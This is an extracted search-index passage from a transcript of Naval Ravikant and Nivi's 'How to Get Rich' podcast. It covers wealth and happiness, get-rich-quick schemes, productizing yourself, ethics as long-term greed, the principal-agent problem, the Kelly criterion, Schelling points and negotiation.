When you\u2019re wealthy, you\u2019ll realize it wasn\u2019t what you were seeking Nivi: The last tweet on the topic of working for the long-term is: \u201c When you\u2019re finally wealthy, you\u2019ll realize it wasn\u2019t what you were seeking in the first place. But that\u2019s for another day. \u201d Naval: That\u2019s a multi-hour topic in and of itself. First of all, I thought it was a really clever way to end the whole thing. It disarms a whole set of people who say, \u201cWhat\u2019s the point of getting rich?\u201d There are a lot of people who like to virtue signal against the idea of wealth creation or making money. It\u2019s also true. Yes, money will solve all your money problems. But it doesn\u2019t get you everywhere. The first thing you realize when you\u2019ve made a bunch of money is that you\u2019re still the same person. If you\u2019re happy, you\u2019re happy. If you\u2019re unhappy, you\u2019re unhappy. If you\u2019re calm and fulfilled and peaceful, you\u2019re still that same person. I know lots of very rich people who are extremely out of shape. I know lots of rich people who have really bad family lives. I know lots of rich people who are internally a mess. A calm mind, a fit body and a house full of love must be earned I would lean on another tweet that I put out. When I think back on it, I think it\u2019s my favorite tweet. It\u2019s not necessarily the most insightful. It\u2019s not necessarily the most helpful. It\u2019s not even the one I think about the most. But when I look at it, there\u2019s such a certain truth in there that it resonates. And that is: \u201c A fit body, a calm mind, a house full of love. These things cannot be bought\u2014they must be earned. \u201d Even if you have all the money in the world, you can\u2019t have those three things. Jeff Bezos still has to work out. He still has to work on his marriage. And his internal mental state still very much won\u2019t be controlled by external events. It\u2019s going to be based on how calm and peaceful he is inside. So I think those three things\u2014your health, your mental health and your close relationships\u2014are things you have to cultivate. They can bring you a lot more peace and happiness than any amount of money ever will. Practical advice for a calmer internal state How to get there is a tweetstorm I\u2019ve been working on. I have probably 100 tweets on it. It\u2019s very hard to say anything on the topic without getting attacked from 50 different directions, especially these days on Twitter. So I\u2019ve been hesitant to do it. I want to target it for a very specific kind of person. There\u2019s a bunch of people who don\u2019t believe working on your internal state is useful. They\u2019re too focused on the external. And that\u2019s fine, there\u2019s nothing wrong with that. That\u2019s who the \u201cHow to Get Rich\u201d tweetstorm is for. There\u2019s a bunch of people who believe the only thing worth working on is complete liberation. Like, you become the Buddha. They\u2019ll attack anything in the middle as being useless. That\u2019s fine, too. But most people aren\u2019t there. I want to create a tweetstorm that offers practical advice for everyday people who want a calmer internal state. A set of understandings, realizations, half-truths and truths, that if you were to imbibe them properly\u2014and, again, these are pointers to ideas you already have and experiences you already have\u2014that if you keep these top of mind, slowly but steadily it will help you with certain realizations that will lead you to a calmer internal state. That\u2019s what I want to work on. Fitness is another big one, I\u2019m just not the expert there. There are plenty of good people on Twitter that who are better at fitness than me. A lot of divorces happen over money, a lot of battles happen over internal anger I think a loving household and relationships actually fall naturally out of the other things. If you have a calm mind and you\u2019ve already made money, you should have good relationships. There\u2019s no reason why you shouldn\u2019t. A lot of divorces happen over money. Unfortunately, that\u2019s just the reality of it. Having money removes that part of it. A lot of external battles happen because your internal state is not good. When you\u2019re naturally internally peaceful you\u2019re going to pick fewer fights. You\u2019re going to be more loving without expecting anything in return. That will take care of things on the external-relationship front. Nivi: To summarize: Money solves your money problems. Money buys you freedom in the material world. And money lets you not do the things you don\u2019t want to do. Naval: Yeah. To me the ultimate purpose of money is so you don\u2019t have to be in a specific place, at a specific time, doing anything you don\u2019t want to do.","title":"A Calm Mind, a Fit Body, a House Full of Love"},{"location":"other/How%20to%20Get%20Rich/#there-are-no-get-rich-quick-schemes","text":"Get rich quick schemes are just someone else getting rich off you There are no get rich quick schemes Nivi: We skipped one tweet because I wanted to cover all of the tweets on the topic of the long-term. The tweet we skipped: \u201c There are no get rich quick schemes. That\u2019s just someone else getting rich off you. \u201d Naval: This goes back to the world being an efficient place. If there\u2019s an easy way to get rich, it\u2019s already been exploited. There are a lot of people who will sell you ideas and schemes on how to make money. But they\u2019re always selling you some $79.95 course or some audiobook or seminar. Which is fine. Everyone needs to eat. People need to make a living. They might actually have really good tips. If they\u2019re giving you actionable, high-quality advice that acknowledges it\u2019s a difficult journey and will take a lot of time, then I think it\u2019s realistic. But if they\u2019re selling you some get rich quick scheme\u2014whether it\u2019s crypto or whether it\u2019s an online business or seminar\u2014they\u2019re just making money off you. That\u2019s their get rich quick scheme. It\u2019s not necessarily going to work for you. We don\u2019t have ads because it would ruin our credibility One of the things about this whole tweetstorm and podcast is that we don\u2019t have ads. We don\u2019t charge for anything. We don\u2019t sell anything. Not because I don\u2019t want to make more money\u2014it\u2019s always nice to make more money; we\u2019re doing work here\u2014but because it would completely destroy the credibility of the enterprise. If I say, \u201cI know how to get rich, and I\u2019m going to sell that to you,\u201d then it ruins it. When I was young, one of my favorite books on the topic was \u201c How To Get Rich ,\u201d by Felix Dennis, the founder of Maxim Magazine. He had a lot of crazy stuff in there. But he had some really good insights too. Whenever I read something by him or by GoDaddy founder Bob Parsons or Andrew Carnegie\u2014people who are already very wealthy, and they clearly made their wealth in other fields, not by selling the how-to-get-rich line\u2014they have a credibility. You just trust them. They\u2019re not trying to make money off of you. They\u2019re obviously trying to win some status and some ego\u2014you always have to have a motivation for doing something. But at least that\u2019s a cleaner reason and why they\u2019re probably not lying. They\u2019re probably not fooling you. They\u2019re not snowing you. Every founder has to lie to every employee At some level every founder has to lie to every employee of the company they have. They have to convince them, \u201cIt\u2019s better for you to work for me than to do what I did and go work for yourself.\u201d I\u2019ve always had a hard time with that. The only honest way to do this, in my opinion, is to tell the entrepreneurs I recruit: \u201cYou\u2019re going to be entrepreneurial in this company, and the day you\u2019re ready to start your own next thing, I\u2019m going to support you. I\u2019m never going to get in the way of you starting a company. But this can be a good place for you to learn how to build a good team and build a good culture; how to find product-market fit; how to perfect your skills; and to meet some amazing people while you figure out exactly what it is you\u2019re going to do. Because positioning, timing and deliberation are very important when starting a company.\u201d What I\u2019ve never been able to do is to look them in the face and say, \u201cYou must be at your desk by 8 a.m.\u201d Because I\u2019m not going to be at my desk by 8 a.m. I want my freedom. I\u2019ve never been able to say to them, \u201cYou\u2019re great at being a director today, and you\u2019ll be a VP tomorrow,\u201d putting them into that cold career path track. Because I don\u2019t believe in it myself. Anyone giving advice on how to get rich should have made their money elsewhere If anyone is giving advice on how to get rich and they\u2019re also making money off of it, they should have made their money elsewhere. You don\u2019t want to learn how to be fit from a fat person. You don\u2019t want to learn how to be happy from a depressed person. So, you don\u2019t want to learn how to be rich from a poor person. But you also don\u2019t want to learn how to be rich from somebody who makes their money by telling people how to be rich. It\u2019s suspect. Nivi: Any time you see somebody who\u2019s gotten rich following some guru\u2019s advice on getting rich, remember that in any random process, if you run it long enough and if enough people participate in it, you will always get every single possible outcome with probability one. Naval: There\u2019s a lot of random error in there. This is why you have to absolutely and completely ignore business journalists and economist academics when they talk about private companies. I won\u2019t name names, but when a famous economist rails on Bitcoin, or when a business journalist attacks the latest company that\u2019s IPO\u2019ing, it\u2019s complete nonsense. Those people have never built anything. They\u2019re professional critics. They don\u2019t know anything about making money. All they know is how to criticize and get pageviews. And you\u2019re literally becoming dumber by reading them. You\u2019re burning neurons. I\u2019ll leave you with a quote from Nassim Taleb that I liked. He said, \u201c To become a philosopher king, start with being a king, not being a philosopher . \u201d Nivi: I\u2019m glad you brought up Taleb, because I was going to finish this by saying: remember the title of his first book, \u201c Fooled By Randomness .\u201d Naval: One of the reasons we\u2019re a little vague in this podcast is because we\u2019re trying to lay down principles that are timeless, as opposed to giving you the winning lottery ticket numbers from yesterday.","title":"There Are No Get Rich Quick Schemes"},{"location":"other/How%20to%20Get%20Rich/#productize-yourself","text":"Figure out what you\u2019re uniquely good at, and apply as much leverage as possible Figure out what you\u2019re uniquely good at and apply as much leverage as possible Nivi: You summarized this entire tweetstorm with two words: \u201c Productize yourself. \u201d Naval: Productize has specific knowledge and leverage. Yourself has uniqueness and accountability. Yourself also has specific knowledge. So you can combine all of these pieces into these two words. If you\u2019re looking towards the long-term, you should ask yourself, \u201cIs this authentic to me? Is it myself that I\u2019m projecting?\u201d And then, \u201cAm I productizing it? Am I scaling it? Am I scaling with labor or capital or code or media?\u201d It\u2019s a very handy, simple mnemonic. What is this podcast? This is a podcast called Naval. I\u2019m literally productizing myself with a podcast. Nivi: You want to figure out what you\u2019re uniquely good at\u2014or what you uniquely are\u2014 and apply as much leverage as possible. So making money isn\u2019t even something you do. It\u2019s not a skill. It\u2019s who you are, stamped out a million times. Find hobbies that make you rich, fit and creative Naval: Making money should be a function of your identity and what you like to do. Another tweet I really liked was, \u201c Find three hobbies: One that makes you money, one that keeps you fit, and one that makes you creative. \u201d I would change that slightly. I would say: One that makes you money, one that makes you fit, and one that makes you smarter. So in my case, my hobbies would be reading and making money, as I love working with startups, investing in them, brainstorming them, starting them. I love the ideation and initial creation phase around startups. On the hobby that keeps you fit, I don\u2019t really have one. The closest thing I have is yoga, but that\u2019s where I sort of fell apart. I think people who, early in life, discover something like surfing or swimming or tennis or some kind of a sport they continue doing throughout most of their life are very lucky, because they found a hobby that will make them fit.","title":"Productize Yourself"},{"location":"other/How%20to%20Get%20Rich/#accountability-means-letting-people-criticize-you","text":"You have to stick your neck out and be willing to fail publicly Accountability means letting people criticize you Nivi: We finished discussing the tweetstorm. We\u2019re going to spend some time on Q&A and discussing tweets that didn\u2019t make it into the \u201c How to Get Rich \u201d tweetstorm. My first question: What are some common failures or things people typically do wrong when they try to apply this advice? Naval: A lot of people don\u2019t understand what specific knowledge is or how to \u201cobtain\u201d it. People don\u2019t understand what accountability entails. They think accountability means being successfully accountable. No\u2014it means you have to stick your neck out and fail publicly. You have to be willing to let people criticize you. One of the reasons I\u2019m less active on Twitter lately is because every tweet summons an army of nitpickers and haters. It gets exhausting. You have to learn to ignore them, or you won\u2019t survive on Twitter. A lot of people try to reconcile this by asking, \u201cShould I quit my 9-to-5 job or not?\u201d That can be a hard decision. You don\u2019t need to go to that extreme. You can start applying accountability, leverage and specific knowledge within your existing career. You don\u2019t necessarily need to fork off and do something else completely different. The most interesting parts should be the ones you disagree with People will use my advice as a way to agree and disagree with their existing biases. They\u2019ll say, \u201cI agree with that part,\u201d and, \u201cThat part you\u2019re completely wrong.\u201d The most interesting tweets should be the ones you disagree with\u2014because clearly I\u2019ve proven I know a few things. If you disagree with it, maybe that\u2019s an area where you can improve your thinking. I improve my thinking all the time. In this tweetstorm I put down the minimum-viable principles. I shared only a small slice of what I\u2019ve learned about how to make money; because 90% of it is suspect. I put down the bedrock, the stuff I\u2019m sure about. I have not yet seen a tweet successfully contradicting anything in this tweetstorm that would cause me to say, \u201cI got that one wrong.\u201d Get the free leverage that\u2019s available in tech Some people will say, \u201cThis only applies to tech entrepreneurs.\u201d I disagree. The real estate example was a good one in that regard. Technology drives leverage\u2014so I\u2019m going to push you in a tech direction to get that free leverage. Obviously, this message is being delivered through the Internet, so it\u2019s going to have a pro-Internet bias. Don\u2019t refuse to do things just because others can\u2019t do them Some people believe it\u2019s unfair to do anything with the opportunities they have because others don\u2019t have the same opportunities. With a defeatist attitude like that, why even get out of bed in the morning? Ninety percent of people are dead. Many people live on a dollar or less a day. Do you? No. You play the hand you\u2019re dealt to the best of your ability. Then you can take the winnings\u2014the pot from that hand\u2014and do whatever you want with it to fix the world. But if you refuse to do things just because others can\u2019t do them, you are living in denial. It\u2019s an excuse to do nothing. Realize your philanthropic vision by running a business Others believe wealth creation is fundamentally at odds with an environmentally healthy planet. They view it as a giant zero-sum game. That\u2019s a false narrative, too. Elon Musk is not playing a zero-sum game with the environment; there are plenty of entrepreneurs like him. There is a word environmentalists love: sustainability . If nothing else, for-profit businesses are financially sustainable. You can do a B Corporation , which has a dual mission. Many non-profit efforts would be better off as for-profit companies. They wouldn\u2019t have to beg for grants. They would be financially sustainable. Some great founders realize their philanthropic visions by running a business.","title":"Accountability Means Letting People Criticize You"},{"location":"other/How%20to%20Get%20Rich/#we-should-eventually-be-working-for-ourselves","text":"But we will have to make sacrifices and take on more risk This advice is for anybody who wants to be entrepreneurial Nivi: Who is this advice targeted to? Is it for my Lyft driver? Is it for an Internet entrepreneur? Is it for somebody who wants to start a YouTube channel? Naval: Because it comes from someone who\u2019s steeped in Silicon Valley and tech companies, it\u2019s always going to have a bias towards that. But I think it\u2019s good for anybody who wants to be entrepreneurial. Anybody who wants to control their own life. Anybody who wants to deterministically and reliably improve their ability to create wealth over time, is patient, and is looking at the long haul. If you\u2019re 80 years old, retired and running out of energy, it\u2019s probably best to stay retired. But there are 80-year-olds who have a lot of energy, who want to do new things and live for the future. Obviously this can apply very easily to a young person. I would say 9 or 10 years old and up. Midlife can be the most fruitful time to apply this advice The most difficult one is probably midlife. When we\u2019re in our 30s, 40s and 50s, we already have a lot invested. We have a lot of obligations. Those are the years we\u2019re earning; people are relying on us. We don\u2019t want to change, because we don\u2019t want to admit defeat. But that\u2019s when it actually can be the most fruitful. It may be the most difficult pivot: You have a 9-to-5 job; you have a family relying on you. It may seem like the things in this podcast are far too idealistic, but maybe it can inform your weekend projects. Maybe it can inform your approach to education; for example, if you\u2019re taking an online course at night. Maybe it can inform what roles you take on at your current company, because they move you closer and closer to points of leverage, points of judgment or points where you\u2019re naturally talented, and you\u2019re able to be more authentic. It might cause you to take on more accountability. Even if applied piecemeal, these principles can guide you\u2014regardless of what stage of life you are in, short of retirement. If you\u2019re retired, test them to see if they\u2019re true and then teach them to your kids or grandkids. There are many different ways to participate. It should apply to almost everybody who has a complete body, sound mind, and is looking to work. Look up the value chain to find leverage Nivi: One way to apply this advice is to look at who is getting leverage off of the work that you\u2019re doing. Look up the value chain\u2014at who\u2019s above you and who\u2019s above them\u2014and see how they are taking advantage of the time and work you\u2019re doing and how they\u2019re applying leverage. People naturally do this because they want to move up the corporate ladder; but that\u2019s mostly about managing other people. You want to manage more capital, products, media and community. People think about moving up the ladder in their organization. But they don\u2019t often think about moving to a different organization or creating their own company to get more leverage. You will do better in a small organization Naval: In general, ceteris paribus \u2014fancy Latin words for \u201call other things equal\u201d\u2014you will do better in a smaller organization than a larger one. You will have more accountability, and your work will be more visible. You\u2019re more likely to be able to try different things, which can help you discover the thing you are uniquely good at. People will be more likely to give you leverage through battlefield promotions. You\u2019ll have more flexibility. There will be more authenticity in how the company operates. Here is a good progression for a career: Start in a large company and progressively move to smaller and smaller ones. It\u2019s very hard to go from a small company to a larger company. Larger companies tend to be more about politics than merit; they\u2019re more stable but less innovative. The goal is that we are all working for ourselves The long-term goal is that we are all wealthy and working for ourselves. The people working for us are essentially robots. Today that\u2019s software robots executing code in data centers. Tomorrow it could be delivery bots, flying bots and mechanical bots\u2014and drones\u2014that are carrying things around. This goes back to the idea that the best relationships are peer relationships. If there\u2019s someone above you, that\u2019s someone to learn from. If you\u2019re not learning from them and improving, nobody should be above you. If there\u2019s somebody below you, it\u2019s because you\u2019re teaching them and enabling them. If you\u2019re not doing that, then get a robot; you don\u2019t need a human below you. This is utopian and still a long way off, but in the not-too-distant future anybody who wants to work for themself will be able to do it. You may have to make sacrifices and take on more risk. You may have to take on more accountability and live with less steady income. But more and more I think younger people are realizing that if they\u2019re going to work, they\u2019re going to work for themselves.","title":"We Should Eventually Be Working for Ourselves"},{"location":"other/How%20to%20Get%20Rich/#being-ethical-is-long-term-greedy","text":"If you cut fair deals, you will get paid in the long run Ethics isn\u2019t something you study; it\u2019s something you do Nivi: In the \u201cHow to Get Rich\u201d tweetstorm you listed things you suggest people study, like programming, sales, reading, writing and arithmetic . One of the items that ended up on the cutting-room floor was ethics, which you also suggest people study. Naval: I was going to put that out as a concession to people who believe making money is evil and that the only way to make it is to be evil. But then I realized ethics is not necessarily something you study. It\u2019s something you think about\u2014and something you do. Everyone has a personal moral code. Where we get our moral code differs for everybody. It\u2019s not like I can point you to a textbook. I can point you to some Roman or Greek text, but that\u2019s not suddenly going to make you ethical. There\u2019s the Golden Rule : \u201cDo unto others as you would have them do unto you.\u201d Or there\u2019s Nassim Taleb\u2019s Silver Rule , which is, \u201cDon\u2019t do unto others what you don\u2019t want them doing unto you. \u201d Trust leads to compounding relationships Once you\u2019ve been in business long enough, you will realize how much of it is about trust. It\u2019s about trust because you want to compound interest. You want to work with trustworthy people for long periods of time without having to reevaluate every discussion or constantly look over your shoulder. Over time you will gravitate to working with certain kinds of people. Similarly, those people will gravitate to working with other ethical people. Being ethical attracts other long-term players Acting ethically turns out to be a selfish imperative. You want to be ethical because it attracts other long-term players in the network. They want to do business with ethical people. If you build a reputation for being ethical, people eventually will pay you just to do deals through you. Your involvement will validate deals and ensure they get done; because you wouldn\u2019t be involved with low-quality stuff. In the long-run, being ethical pays off\u2014but it\u2019s the very long run. In the short-run, being unethical pays off, which is why so many people go for it. It\u2019s short-term greedy. Being ethical is long-term greedy You can be ethical simply because you\u2019re long-term greedy. I can even outline a framework for different parts of ethics just based on the idea of long-term selfishness. For example, you want to be honest because it leaves you with a clear mind. You don\u2019t want two threads running in your head, one with the lies you tell \u2014and now have to keep track of\u2014and the other with the truth. If you are honest, you only have to think about one thing at a time, which frees up mental energy and makes you a clearer thinker. Also, by being honest you\u2019re rejecting people who only want to hear pretty lies. You force those people out of your network. Sometimes it\u2019s painful, especially with friends and family. But over the long-term you create room for the people who like you exactly the way that you are. That is a selfish reason to be honest. If you cut fair deals, you will get paid in the long run Negotiations offer another good example. If you\u2019re the kind of person who always tries to get the best deal for yourself, you will win a lot of early deals and it will feel very good. On the other hand, a few people will recognize that you\u2019re always scrabbling and not acting fairly, and they will tend to avoid you. Over time those are the people who end up being the dealmakers in the network. People go to them for a fair shake or to figure out what\u2019s fair. If you cut people fair deals, you won\u2019t get paid in the short-term. But over the long-term, everybody will want to deal with you. You end up being a market hub. You have more information. You have trust. You have a reputation. And people end up doing deals through you in the long-run. A lot of wisdom involves realizing long-term consequences of your actions. The longer your time horizon, the wiser you\u2019re going to seem to everybody around you.","title":"Being Ethical Is Long-Term Greedy"},{"location":"other/How%20to%20Get%20Rich/#envy-can-be-useful-or-it-can-eat-you-alive","text":"Envy can give you a powerful boost, or it can eat you alive Suffering through the wrong thing can motivate you to find the right thing Nivi: Do you want to tell us about jobs you had growing up and the one that kicked off your fanatical obsession with creating wealth? Naval: This gets a little personal, and I don\u2019t want to humble-brag. There was a thread going around Twitter\u2014 Name Five Jobs You\u2019ve Held \u2014and every rich person on there was signaling how they\u2019ve held normal jobs. I don\u2019t want to play that game. I\u2019ve had menial jobs. There are people who had it worse than me and people who had it better than me. At one point in college I was washing dishes in the school cafeteria and said, \u201cF this. I hate this. I can\u2019t do this anymore.\u201d I sweet-talked may way into a teaching assistant job for a computer science professor, even though I was completely unqualified. The job forced me to learn computer algorithms, so I could TA the rest of the course. So my desire to learn computer algorithms came out of the suffering I experienced washing dishes\u2014not that there\u2019s anything wrong with washing dishes; it just wasn\u2019t for me. I had an active mind. I wanted to make money and earn a living through mental activities, not through physical activities. Sometimes it takes suffering through the wrong thing to motivate you to find the right thing. Being a lawyer was not what I was meant to do Back in the day I had a prestigious internship at a big New York City law firm. I basically got fired for surfing Usenet . This was before the Internet was a big thing. Usenet hosted newsgroups, and it was the only the only thing keeping me from being completely bored. I was an overpaid intern wearing a suit and tie. I got to hang out in the conference room and make photocopies when lawyers needed them. I was bored out of my skull. This was pre-iPhone (thank God for Steve Jobs for saving us all from unending boredom). I used to read The Wall Street Journal or anything I could get my hands on. I would\u2019ve read the back of a brochure to keep from going insane, because listening to a bunch of corporate lawyers discuss how to optimize details of a contract is really dull. They wanted me to sit there quietly and not read the paper. They got mad and said, \u201cThat\u2019s rude. That\u2019s misbehavior.\u201d I got called up and reprimanded a bunch of times. I was finally terminated\u2014sent home in shame from my prestigious internship, destroying my chance to go to law school. I was unhappy\u2026 for all of an hour . Ultimately, it\u2019s one of the best things that ever happened to me. Otherwise, I would have ended up a lawyer. Not that I have anything against lawyers; it\u2019s just not what I was meant to do. Envy can be useful or it can eat you alive Nivi: You mentioned a catering job that kicked off your obsession with wealth. Naval: That was an envy thing. When I was in high school, I needed a job to pay for my first semester of college. It was the summer of 1990 or 1991. This was the Bush Senior recession\u2014if anyone listening was alive back then to remember it\u2014so it was actually really hard to get a job. I ended up working for a catering company serving Indian food. One day, I had to serve at a birthday party for a kid in my school. So I was out there serving food and drinks to all of my classmates. That was incredibly embarrassing. I wanted to hide away and die right there. But you know what? It\u2019s all part of the plan. It\u2019s all part of the motivation. If that didn\u2019t happen, I probably wouldn\u2019t be as motivated or as successful. It\u2019s all fine. It was definitely a strong motivator. In that sense, envy can be useful. Envy also can eat you alive if you let it follow you around your entire life. But there are points in your life when it can be a powerful booster rocket.","title":"Envy Can Be Useful, or It Can Eat You Alive"},{"location":"other/How%20to%20Get%20Rich/#principal-agent-problem-act-like-an-owner","text":"If you think and act like an owner, it\u2019s only a matter of time until you become an owner A principal is an owner; an agent is an employee Nivi: We spoke earlier about picking a business model that has leverage from scale economies, network effects and zero marginal cost of replication . There were a few other ideas on the cutting-room floor that I want to go through with you. The first one is the principal-agent problem . Naval: So mental models are all the rage. Everyone\u2019s trying to become smarter by adopting mental models. I think mental models are interesting, but I don\u2019t think explicitly in terms of mental-model checklists. I know Charlie Munger does, but that\u2019s just not how I think. Instead, I tend to focus on the few lessons I\u2019ve learned over and over in life that I think are incredibly important and seem to apply almost universally. One that keeps coming up from microeconomics\u2014because as we\u2019ve established, macroeconomics is not really worth spending time on\u2014is what\u2019s called the principal-agent problem. In this case it\u2019s a principal, who is a person; rather than a principle that you would follow. A principal is an owner. An agent works for the owner, so you can think of an agent as an employee. The difference between a founder and an employee is the difference between a principal and an agent. A principal\u2019s incentives are different than an agent\u2019s incentives I can summarize the principal-agent problem with a famous quote attributed to Napoleon or Julius Caesar: \u201cIf you want it done, Go. If not, Send.\u201d Which is to say: If you want to do something right, do it yourself; because other people just don\u2019t care enough. Now, the principal-agent problem pops up everywhere. In microeconomics, they try to characterize it this way: The principal\u2019s incentives are different than the agent\u2019s incentives, so the owner of the business wants what is best for the business and will make the most money. The agent generally wants whatever will look good to the principal, or might make them the most friends in the neighborhood or in the business, or might make them personally the most money. You see this a lot with hired-gun CEOs running public companies, where the ownership of the public company is distributed so widely that there\u2019s no principal remaining. Nobody owns more than 1% of the company. The CEO takes charge, stuffs the board with their buddies and then starts issuing themself low-price stock options, or doing a lot of stock buybacks because their compensation is based directly tied to the stock price. If you can work on incentives, don\u2019t work on anything else Agents have a way of hacking systems. This is what make incentive design so difficult. As Charlie Munger says, if you could be working on incentives, don\u2019t work on anything else . Almost all human behavior can be explained by incentives. The study of signaling is seeing what people do despite what they say. People are much more honest with their actions than they are with their words. You have to get the incentives right to get people to behave correctly. It\u2019s a very difficult problem because people aren\u2019t coin-operated. The good ones are not just looking for money\u2014they\u2019re also looking for things like status and meaning in what they do. As a business owner you are always going to be dealing with the principal-agent problem. You\u2019re always going to be trying to figure out: How do I make this person think like me? How do I incent them? How do I give them founder mentality? Only founders can fully appreciate the importance of a founder mentality and just how difficult and gnarly principal-agent problem is. When you do deals, it\u2019s better to have the same incentives If you are a principal, you want to spend a lot of your time thinking about this problem. You want to be generous with your top lieutenants\u2014in terms of ownership and incentives\u2014even if they don\u2019t necessarily realize it; because over time they will and you want them to be aligned with you. When you do business deals, it\u2019s better to have an aligned partnership where you both have the same incentives than a partnership where you have the advantage in the deal. Because eventually the other person will figure it and the partnership will fall apart. Either way, it\u2019s not going to be one of those things that you can invest in and enjoy the benefits of compound interest over decades. If you\u2019re an employee, your most important job is to think like a principal Finally, if you\u2019re in a role where you\u2019re an agent\u2014you\u2019re an employee\u2014then your most important job is to think like a principal. The more you can think like a principal, the better off you\u2019re going to be long-term. Train yourself how to think like a principal, and eventually you will become a principal. If you align yourself with a good principal, they will promote you or empower you or give you accountability or leverage that may be way out of proportion to your relatively menial role. I\u2019m always impressed by founders who promote young people through the ranks and allow them to skip multiple levels despite their lack of experience. Invariably it happens because this agent\u2014who\u2019s way deep down in the organization\u2014thinks like a principal. If you can hack your way through the principal-agent problem, you\u2019ll probably solve half of what it takes to run a company. Nivi: The reason I asked about this one first is because I feel like I never see the principal-agent problem in my work. I tend to work in small teams where everybody is highly economically aligned, and the people have been filtered for a commitment to the mission, and everybody else who doesn\u2019t work out moves on to another role elsewhere. Naval: These are all heuristics that you have designed to avoid having to deal with the single biggest problem in management. Deal with small firms to avoid the principal-agent problem Another example of a heuristic that helps you route around the principal-agent problem is to deal with the smallest firms possible. For example, when I hire a lawyer or a banker or even an accountant to work on my deals, I\u2019ve become very cognizant about the size of the firm. Bigger firms\u2014all other things being equal\u2014are generally worse than small ones. Yes, the big firm has more experience. Yes, they have more people. Yes, they have a bigger brand. But you\u2019ll find the principal and the agent are highly separated. Very often the principal will sell you and convince you to work with the firm, but then all the work will be done by an agent who simply doesn\u2019t care as much. You end up getting substandard service. I prefer to work with boutiques. My ideal law firm is a law firm of one. My ideal banker is a solo banker. Now, you\u2019re making other sacrifices and trade-offs in terms of that person\u2019s resources\u2014and you are betting big on that person. But you\u2019ve got one throat to choke. There\u2019s no one else to point fingers at; there\u2019s nowhere to run. The accountability is extremely high. If you are an agent, the best way to operate is to ask, \u201cWhat would the founder do?\u201d If you think like the owner and you act like the owner, it\u2019s only a matter of time until you become the owner.","title":"Principal-Agent Problem: Act Like an Owner"},{"location":"other/How%20to%20Get%20Rich/#kelly-criterion-avoid-ruin","text":"Don\u2019t ruin your reputation or get wiped to zero Don\u2019t bet everything on one big gamble Nivi: Let\u2019s chat about the Kelly criterion. Naval: The Kelly criterion is a popularized mathematical formulation of a simple concept. The simple concept is: Don\u2019t risk everything. Stay out of jail. Don\u2019t bet everything on one big gamble. Be careful how much you bet each time, so you don\u2019t lose the whole kitty. If you\u2019re a gambler, the Kelly criterion mathematically formulates how much you should wager per hand, even if you have an edge\u2014because even when you have an edge, you can still lose. Let\u2019s say you have 51-to-49 edge. Every gambler knows not to bet the whole kitty on that 51-to-49 edge\u2014because you could lose everything and won\u2019t get to come back to the average. Nassim Taleb famously talks about ergodicity , which is a fancy word for a simple concept: What is true for 100 people on average isn\u2019t the same as one person averaging that same thing 100 times. Ruining your reputation is the same as getting wiped to zero The easiest way to see that is with Russian roulette . Say six people play Russian roulette one time each, and each winner gets $1 billion. One person ends up dead and five people get $1 billion. Compare that to one person playing Russian roulette six times with the same gun. They are never going to end up a billionaire\u2014they will be dead and worth zero. So risk-taking\u2014especially when the averages that are calculated across large populations\u2014is not always rational. The Kelly criterion helps you avoid ruin. The number one way people get ruined in modern business is not by betting too much; it\u2019s by cutting corners and doing unethical or downright illegal things. Ending up in an orange jumpsuit in prison or having a reputation ruined is the same as getting wiped to zero\u2014so never do those things.","title":"Kelly Criterion: Avoid Ruin"},{"location":"other/How%20to%20Get%20Rich/#schelling-point-cooperating-without-communicating","text":"People who can\u2019t communicate can cooperate by anticipating the other person\u2019s actions Use social norms to cooperate when you can\u2019t communicate Nivi: Let\u2019s talk about Schelling points. Naval: The Schelling point is a game theory concept made famous by Thomas Schelling in his book, The Strategy of Conflict , which I recommend. It\u2019s about multiplayer games where people respond based on what they think the other person\u2019s response will be. He came up with a mathematical formalization to answer: How do you get people who cannot communicate with each other to coordinate? Suppose I want to meet with you, but I don\u2019t tell you where or when to meet. You also want to meet with me, but we can\u2019t communicate. That sounds like an impossible problem to solve\u2014we can\u2019t do it. But not quite. You can use social norms to converge on a Schelling point. I know you\u2019re rational and educated. And you know I\u2019m rational and educated. We\u2019re both going to start thinking. When will we meet? If we have to pick an arbitrary date, we\u2019ll probably pick New Year\u2019s Eve. What time will we meet? Midnight or 12:01 a.m. Where will we meet? If we\u2019re Americans, the big meeting spot is probably New York City, the most important city. Where in New York City will we meet? Probably under the clock at Grand Central Station. Maybe you end up at the Empire State Building, but not likely. You can find Schelling points in business, art and politics There are many games\u2014whether it\u2019s business or art or politics\u2014where you can find a Schelling point. So you can cooperate with the other person, even when you can\u2019t communicate. Here\u2019s a simple example: Suppose two companies are competing heavily and hold an oligopoly. Let\u2019s say the price fluctuates between $8 and $12 for whatever the service is. Don\u2019t be surprised if they converge on $10 without ever talking to each other.","title":"Schelling Point: Cooperating Without Communicating"},{"location":"other/How%20to%20Get%20Rich/#turn-short-term-games-into-long-term-games","text":"Improve your leverage by turning short-term relationships into long-term ones Pareto optimal solutions require a trade-off to improve any criterion Nivi: Do you want to talk about Pareto optimal ? Naval: Pareto optimal is another concept from game theory, along with Pareto superior. Pareto superior means something is better in some ways while being equal or better in other ways. It\u2019s not worse in any way. This is an important concept when you\u2019re negotiating. If you can make a solution Pareto superior to where it was before, you will always do that. Pareto optimal is when the solution is the best it can possibly be and you can\u2019t change it without making it worse in at least one dimension. There is a hard trade-off from this point forward. These are important concepts to understand when you\u2019re involved in a big negotiation. Negotiations are won by whoever cares less I generally say, though: \u201c Negotiations are won by whoever cares less .\u201d Negotiation is about not wanting it too badly. If you want something too badly, the other person can extract more value from you. If someone is taking advantage of you in a negotiation, your best option is to turn it from a short-term game into a long-term game. Try to make it a repeat game. Try to bring reputation into the negotiation. Try to include other people who may want to play games with this person in the future. An example of a high-cost, low-information single-move game is having your house renovated. Contractors are notorious for overbooking, ripping people off, and being unaccountable. I\u2019m sure contractors have their own side to it: \u201cThe homeowner has unreasonable demands.\u201d \u201cWe found problems.\u201d \u201cThe homeowner doesn\u2019t want to pay for it.\u201d \u201cThey don\u2019t understand; they\u2019re low-information buyers.\u201d It\u2019s an expensive transaction. Historically it\u2019s been very hard to find good contractors; and the contractor has little information on the homeowner. Convert single-move games to multi-move games So you try to go through friends. You try to find people with good reputations. You\u2019re converting an expensive single-move game with a high probability of cheating on both sides into a multi-move game. One way to do that is to say: \u201cActually, I need two different projects done. The first project we\u2019ll do together, and based on that I\u2019ll decide if we do the second project.\u201d Another way is to say: \u201cI\u2019m going to do this project with you, and I have three friends who want projects done who are waiting to see the outcome of this project.\u201d Another way is to write a Yelp or Thumbtack review\u2014especially if the contractor operates within a community and wants to protect their reputation in that community. These are all ways to 